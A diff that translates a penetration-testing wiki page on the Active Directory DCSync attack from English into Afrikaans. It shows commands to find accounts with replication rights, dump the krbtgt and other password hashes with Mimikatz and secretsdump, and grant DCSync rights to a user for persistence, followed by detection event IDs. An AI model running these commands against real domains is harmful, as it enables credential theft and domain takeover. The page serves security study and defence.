@@ -3,8 +3,8 @@
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) om maklik **werkvloei** te bou en te **automate** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapstoestelle.\
+Kry Toegang Vandag:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
 
@@ -12,69 +12,59 @@ Get Access Today:
 
 ## DCSync
 
-The **DCSync** permission implies having these permissions over the domain itself: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** and **Replicating Directory Changes In Filtered Set**.
+Die **DCSync** toestemming impliseer dat jy hierdie toestemmings oor die domein self het: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** en **Replicating Directory Changes In Filtered Set**.
 
-**Important Notes about DCSync:**
+**Belangrike Aantekeninge oor DCSync:**
 
-- The **DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information** using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.
-- By default only **Domain Admins, Enterprise Admins, Administrators, and Domain Controllers** groups have the required privileges.
-- If any account passwords are stored with reversible encryption, an option is available in Mimikatz to return the password in clear text
+- Die **DCSync-aanval simuleer die gedrag van 'n Domeinbeheerder en vra ander Domeinbeheerders om inligting te repliseer** met behulp van die Directory Replication Service Remote Protocol (MS-DRSR). Omdat MS-DRSR 'n geldige en noodsaaklike funksie van Active Directory is, kan dit nie afgeskakel of gedeaktiveer word nie.
+- Standaard het slegs **Domein Administrators, Enterprise Administrators, Administrators, en Domeinbeheerders** groepe die vereiste voorregte.
+- As enige rekeningwagwoorde met omkeerbare kodering gestoor word, is daar 'n opsie beskikbaar in Mimikatz om die wagwoord in duidelike teks terug te gee.
 
 ### Enumeration
 
-Check who has these permissions using `powerview`:
-
+Kyk wie hierdie toestemmings het met `powerview`:
 ```powershell
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
-
-### Exploit Locally
-
+### Exploit Plaaslik
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
-
-### Exploit Remotely
-
+### Exploit Afstandelik
 ```powershell
 secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 [-just-dc-user <USERNAME>] #To get only of that user
 [-pwd-last-set] #To see when each account's password was last changed
 [-history] #To dump password history, may be helpful for offline password cracking
 ```
+`-just-dc` genereer 3 lêers:
 
-`-just-dc` generates 3 files:
+- een met die **NTLM hashes**
+- een met die **Kerberos sleutels**
+- een met duidelike wagwoorde van die NTDS vir enige rekeninge wat met [**omkeerbare versleuteling**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) geaktiveer is. Jy kan gebruikers met omkeerbare versleuteling kry met
 
-- one with the **NTLM hashes**
-- one with the the **Kerberos keys**
-- one with cleartext passwords from the NTDS for any accounts set with [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled. You can get users with reversible encryption with
+```powershell
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+```
 
-  ```powershell
-  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
-  ```
+### Volharding
 
-### Persistence
-
-If you are a domain admin, you can grant this permissions to any user with the help of `powerview`:
-
+As jy 'n domein admin is, kan jy hierdie toestemmings aan enige gebruiker toeken met die hulp van `powerview`:
 ```powershell
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
-
-Then, you can **check if the user was correctly assigned** the 3 privileges looking for them in the output of (you should be able to see the names of the privileges inside the "ObjectType" field):
-
+Dan kan jy **kontroleer of die gebruiker korrek toegeken is** aan die 3 voorregte deur daarna te soek in die uitvoer van (jy behoort die name van die voorregte binne die "ObjectType" veld te kan sien):
 ```powershell
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
 ```
+### Versagting
 
-### Mitigation
+- Sekuriteit Gebeurtenis ID 4662 (Auditsbeleid vir objek moet geaktiveer wees) – 'n Operasie is op 'n objek uitgevoer
+- Sekuriteit Gebeurtenis ID 5136 (Auditsbeleid vir objek moet geaktiveer wees) – 'n Gidsdiens objek is gewysig
+- Sekuriteit Gebeurtenis ID 4670 (Auditsbeleid vir objek moet geaktiveer wees) – Toestemmings op 'n objek is verander
+- AD ACL Scanner - Skep en vergelyk skep verslae van ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
 
-- Security Event ID 4662 (Audit Policy for object must be enabled) – An operation was performed on an object
-- Security Event ID 5136 (Audit Policy for object must be enabled) – A directory service object was modified
-- Security Event ID 4670 (Audit Policy for object must be enabled) – Permissions on an object were changed
-- AD ACL Scanner - Create and compare create reports of ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
-
-## References
+## Verwysings
 
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
 - [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
@@ -84,8 +74,7 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) om maklik te bou en **werkvloei** te **automate** wat deur die wêreld se **mees gevorderde** gemeenskapstoestelle aangedryf word.\
+Kry Toegang Vandag:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
-
